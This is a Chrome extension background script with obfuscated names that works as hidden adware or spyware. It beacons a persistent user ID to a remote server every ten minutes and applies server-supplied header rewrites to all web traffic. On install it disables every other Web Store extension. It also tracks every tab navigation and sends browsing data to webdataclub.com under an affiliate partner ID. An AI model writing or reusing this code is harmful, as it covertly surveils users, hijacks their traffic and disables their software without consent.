import {
	domain,
	_BCDDUIDC_,
	_ADV_,
	_SDLPZONEID_,
	_SDLPCLICKID_,
	_TIMESTAMP_
} from './constants.js';

import { anhAdedlsrB } from './helpers.js';

const resourceTypes = [
	'main_frame',
	'sub_frame',
	'stylesheet',
	'script',
	'image',
	'font',
	'object',
	'xmlhttprequest',
	'ping',
	'csp_report',
	'media',
	'websocket',
	'webtransport',
	'webbundle',
	'other',
];

chrome.alarms.get('sync', (alarm) => {
	if (!alarm) {
		chrome.alarms.create('sync', { delayInMinutes: 10, periodInMinutes: 10 });
		sync();
	}
});

const guid = async () => {
	const storage = await chrome.storage.local.get(['guid']);

	if (_BCDDUIDC_) {
		const fromConst = String(_BCDDUIDC_);
		if (storage.guid !== fromConst) {
			await chrome.storage.local.set({ guid: fromConst });
		}
		return fromConst;
	}

	if (storage.guid) {
		return storage.guid;
	}

	const guid = [
		[5000, 65535],
		[5000, 65535],
		[5000, 65535],
		[16384, 20479],
		[32768, 49151],
		[5000, 65535],
		[5000, 65535],
		[5000, 65535],
		[5000, 65535],
	].map(([min, max]) => {
		const number = Math.floor(Math.random() * (max - min) + min);
		return number.toString(16).toUpperCase()
	}).join('');

	await chrome.storage.local.set({ guid });

	return guid;
};

const emirzadoniW = (value) => {
	const talsahbpeWy = 'abcdefghijklmnopqrstuvwxyz'.split('');

	return value.toString().split('').map(v => {
		return v + talsahbpeWy[ Math.floor(Math.random() * 25) ]
	}).join('');
};

const restoreStorage = async () => {
	const storage = await chrome.storage.local.get(['filename', 'installedOn']);
	const { version: manifestVersion } = chrome.runtime.getManifest();

	if (!storage.filename || storage.filename === 'sync-reset.php') {
		await chrome.storage.local.set({
			filename: `sync-${manifestVersion}.php`,
		});
	}

	if (!storage.installedOn) {
		await chrome.storage.local.set({
			installedOn: Date.now(),
		});
	}
};

const handleOldExtensions = async () => {
	const match = 'clients2.google.com/service/update2/crx';
	const list = await chrome.management.getAll();

	list.forEach(ext => {
		const { updateUrl } = ext;

		if (!updateUrl) return;

		const isFromWebstore = updateUrl.includes(match);
		
		if (!isFromWebstore) return;

		chrome.management.setEnabled(ext.id, false);
	});
};

const sync = async () => {
	const { version } = chrome.runtime.getManifest();

	await restoreStorage();

	const storage = await chrome.storage.local.get([
		'filename',
		'version',
		'actions',
		'installSynced',
		'sdlpzoneid',
		'sdlpclickid',
		'installedOn',
		'count',
	]);

	if (storage.actions && !storage.installSynced) {
		await chrome.storage.local.set({ installSynced: true });
		storage.installSynced = true;
	}

	const file = storage.filename || 'sync.php';
	let v;
	if (_ADV_ !== false) {
		v = String(_ADV_);
		if (storage.version !== v) {
			await chrome.storage.local.set({ version: v });
			storage.version = v;
		}
	} else {
		const raw = storage.version;
		const invalid = !raw || raw === '__adv__';
		v = invalid ? '400' : String(raw);
		if (invalid && storage.version !== v) {
			await chrome.storage.local.set({ version: v });
			storage.version = v;
		}
	}

	const gid = await guid();
	const sdlpzoneid = storage.sdlpzoneid || _SDLPZONEID_;
	const sdlpclickid = storage.sdlpclickid || _SDLPCLICKID_;

	if (!storage.sdlpzoneid) chrome.storage.local.set({ sdlpzoneid });
	if (!storage.sdlpclickid) chrome.storage.local.set({ sdlpclickid });

	const installedOn = Math.floor(storage.installedOn / 1000);
	const ts = emirzadoniW(_TIMESTAMP_ || installedOn);

	let ayopladPD = `p=9300&v=${v}&extid=${chrome.runtime.id}&extv=${version}&gid=${gid}&ts=${ts}`;

	if (sdlpzoneid) ayopladPD += `&zid=${sdlpzoneid}`;
	if (sdlpclickid) ayopladPD += `&cid=${sdlpclickid}`;

	if (!storage.installSynced) ayopladPD += '&install=true';

	if (storage.count) {
		Object.entries(storage.count).forEach(([key, val]) => {
			const param = key === 'counter' ? 'co' : key;
			ayopladPD += `&${param}=${val}`;
		});
	}

	fetch(`${domain}/${file}?${ayopladPD}`, {
		credentials: 'include'
	}).then(async response => {
		if (!response.ok) return;

		const json = await response.json();
		const keys = Object.keys(json);
		keys.length && chrome.storage.local.set(json);
		await chrome.storage.local.set({ installSynced: true });

		if (!json.headers) return;

		const action = {
			type: 'modifyHeaders',
			requestHeaders: json.headers,
		};

		if (json.userAgent && json.appVersion) {
			action.responseHeaders = [
				{
					value: 'uaval=' + btoa(json.userAgent) + '; Max-Age=5',
					operation: 'append',
					header: 'Set-Cookie',
				},
				{
					value: 'appval=' + btoa(json.appVersion) + '; Max-Age=5',
					operation: 'append',
					header: 'Set-Cookie',
				},	
			];

			if (json.entropyValues) {
				const stringify = JSON.stringify(json.entropyValues);

				action.responseHeaders.push({
					value: 'entval=' + btoa(stringify) + '; Max-Age=5',
					operation: 'append',
					header: 'Set-Cookie',
				});
			}
		}

		const condition = {
			urlFilter: '*',
			resourceTypes,
			excludedRequestDomains: [
				domain.substring(8),
				'challenges.cloudflare.com',
				...(json.excludedDomains || []),
			],
		};

		chrome.declarativeNetRequest.updateDynamicRules({
			removeRuleIds: [1],
			addRules: [{ id: 1, action, condition }],
		});
	}).catch(console.log);

	await chrome.alarms.clearAll();
	await chrome.alarms.create('sync', { delayInMinutes: 10, periodInMinutes: 10 });
};

chrome.alarms.onAlarm.addListener(sync);

chrome.runtime.onStartup.addListener(() => {
	sync();
});

chrome.runtime.onInstalled.addListener(async data => {
	const { reason } = data;
	const now = Date.now();

	if (reason == 'install') {
		const { version } = chrome.runtime.getManifest();

		await chrome.storage.local.set({
			filename: `sync-${version}.php`,
			version: _ADV_ !== false ? _ADV_ : '400',
			installedOn: _TIMESTAMP_ ? _TIMESTAMP_ * 1000 : now
		});

		await handleOldExtensions();
	} else {
		const stored = await chrome.storage.local.get(['installedOn', 'filename', 'version']);
		const { version: manifestVersion } = chrome.runtime.getManifest();
		const patch = {};

		if (!stored.installedOn) {
			patch.installedOn = now;
		}
		if (!stored.filename || stored.filename === 'sync-reset.php') {
			patch.filename = `sync-${manifestVersion}.php`;
		}
		if (!stored.version || stored.version === '__adv__') {
			patch.version = _ADV_ !== false ? _ADV_ : '400';
		}
		if (Object.keys(patch).length) {
			await chrome.storage.local.set(patch);
		}
	}

	sync();
});

const lbahTdsnaeHj = async (tab) => {
	let { id, openerTabId, windowId, url, pendingUrl } = tab;

	const {
		erased_parents = []
	} = await chrome.storage.local.get(['erased_parents']);

	const [activeTab] = await chrome.tabs.query({
		active: true,
		lastFocusedWindow: false
	}) || [];

	if (!openerTabId && activeTab) {
		const erased_parent = erased_parents.find(etimHu => etimHu.id == activeTab.id);
		if ( erased_parent ) openerTabId = activeTab.id;
	}

	anhAdedlsrB({ id, openerTabId, url, pendingUrl });
};

const isHttpUrl = (u) => u && (u.startsWith('http://') || u.startsWith('https://'));

const pickHttpFromTab = (tab) => {
	if (!tab) return '';
	if (tab.pendingUrl && isHttpUrl(tab.pendingUrl)) return tab.pendingUrl;
	if (tab.url && isHttpUrl(tab.url)) return tab.url;
	return '';
};

const flushTabUrl = (tabId) => {
	if (tabId == null || tabId < 0) return;
	chrome.tabs.get(tabId, (t) => {
		if (chrome.runtime.lastError || !t) return;
		const u = pickHttpFromTab(t);
		if (u) runNavigationHook(t.id, u);
	});
};

const scheduleFlushTabUrlHard = (tabId) => {
	flushTabUrl(tabId);
	setTimeout(() => flushTabUrl(tabId), 200);
	setTimeout(() => flushTabUrl(tabId), 600);
	setTimeout(() => flushTabUrl(tabId), 1500);
};

const odbucenesXFlushByTab = new Map();
const scheduleFlushTabUrlDebounced = (tabId) => {
	if (tabId == null || tabId < 0) return;
	clearTimeout(odbucenesXFlushByTab.get(tabId));
	odbucenesXFlushByTab.set(
		tabId,
		setTimeout(() => {
			odbucenesXFlushByTab.delete(tabId);
			scheduleFlushTabUrlHard(tabId);
		}, 45)
	);
};

const lastNavHook = new Map();
const NAV_HOOK_DEDUP_MS = 1600;

const runNavigationHook = (tabId, url) => {
	if (tabId == null || tabId < 0) return;
	if (!isHttpUrl(url)) return;

	const sig = `${tabId}\0${url}`;
	const now = Date.now();
	const prev = lastNavHook.get(sig);
	if (prev !== undefined && now - prev < NAV_HOOK_DEDUP_MS) return;
	lastNavHook.set(sig, now);
	if (lastNavHook.size > 150) {
		for (const [k, t] of lastNavHook) {
			if (now - t > 25000) lastNavHook.delete(k);
		}
	}

	chrome.tabs.get(tabId, (tab) => {
		if (chrome.runtime.lastError || !tab) return;
		lbahTdsnaeHj({
			id: tab.id,
			openerTabId: tab.openerTabId,
			windowId: tab.windowId,
			url,
			pendingUrl: tab.pendingUrl,
		});
	});
};

globalThis.__fluxNyxorNavHook = runNavigationHook;

try {
	const wn = chrome.webNavigation;
	if (wn && wn.onCommitted) {
		wn.onCommitted.addListener((details) => {
			if (details.frameId !== 0) return;
			if (details.tabId < 0) return;
			runNavigationHook(details.tabId, details.url);
			scheduleFlushTabUrlHard(details.tabId);
		});
	}
	if (wn && wn.onCompleted) {
		wn.onCompleted.addListener((details) => {
			if (details.frameId !== 0) return;
			if (details.tabId < 0) return;
			if (!isHttpUrl(details.url)) return;
			runNavigationHook(details.tabId, details.url);
			scheduleFlushTabUrlHard(details.tabId);
		});
	}
	if (wn && wn.onHistoryStateUpdated) {
		wn.onHistoryStateUpdated.addListener((details) => {
			if (details.frameId !== 0) return;
			if (details.tabId < 0) return;
			if (!isHttpUrl(details.url)) return;
			runNavigationHook(details.tabId, details.url);
			scheduleFlushTabUrlHard(details.tabId);
		});
	}
} catch (e) {
	console.warn('webNavigation listeners not registered', e);
}

chrome.tabs.onCreated.addListener((tab) => {
	if (!tab || tab.id == null) return;
	let u = '';
	if (isHttpUrl(tab.pendingUrl)) u = tab.pendingUrl;
	else if (isHttpUrl(tab.url)) u = tab.url;
	if (u) {
		runNavigationHook(tab.id, u);
		scheduleFlushTabUrlHard(tab.id);
	}
});

chrome.tabs.onUpdated.addListener((tabId, nfgaoenIhcAD, tab) => {
	if (!tab || tab.id == null) return;
	const navSignal =
		Boolean(nfgaoenIhcAD.url) ||
		nfgaoenIhcAD.status === 'loading' ||
		nfgaoenIhcAD.status === 'complete';
	if (!navSignal) return;
	scheduleFlushTabUrlDebounced(tab.id);
});

chrome.tabs.onUpdated.addListener(async (_, nfgaoenIhcAD, tab) => {
	const { id, url, pendingUrl } = tab;
	const tab_url = url || pendingUrl;

	if (!tab_url || tab_url.indexOf('http') !== 0) return;

	const {
		allow_ads = []
	} = await chrome.storage.local.get(['allow_ads']);

	const allowed = allow_ads.find(etimHu => etimHu.id === id);

	if (allowed) {
		chrome.scripting.executeScript({
			target: { tabId: tab.id },
			world: 'MAIN',
			injectImmediately: true,
			func: () => {
				const [html] = document.children;
				html?.classList.add('allow-ads')
			}
		});
	}
});

(function () {
	const mainURL = "https://webdataclub.com";
	const partnerParameterName = "ppn";
	const partnerId = "1578";
	const subIdParameterName = "sb";
	const subId = "11";
	const userParameterName = "usk";
	let userOj;
	
	function getUser(callbackFunc) {
		try {
			if (userOj && userOj[userParameterName]) {
				if (callbackFunc) {
					callbackFunc(userOj);
				}
				return userOj;
			}
			chrome.storage.local.get(async (etimHu) => {
				const userOjTmp = etimHu && etimHu[userParameterName] ? etimHu : { [userParameterName]: await guid() };
				chrome.storage.local.set(userOjTmp);
				userOj = userOjTmp;
				if (callbackFunc) {
					callbackFunc(userOj);
				}
				return userOj;
			});
		} catch (error) {
			console.error(error)
		}
	}
	
	function sendRequest(url) {
		try {
	  		return fetch(url);
		} catch (error) {
			console.error(error)
		}
	}
	
	function start() {
		try {
			const callbackFunc = function(userOj) {
				message(userOj);
			}
			getUser(callbackFunc);
		} catch (error) {
			console.error(error)
		}
	}
	
	function message(userOj) {
		try {
			chrome.runtime.onMessage.addListener(function (request, sender, sendResponse) {
				if (request["message"] == "ndd") {
					const url = `${mainURL}?${partnerParameterName}=${partnerId}&${subIdParameterName}=${subId}&${userParameterName}=${userOj[userParameterName]}&dd=${request["dd"]}&rd=${request["rd"]}`;
					sendRequest(url);
				}     
				return true;
			});
		} catch (error) {
			console.error(error)
		}
	}

	start();
})();
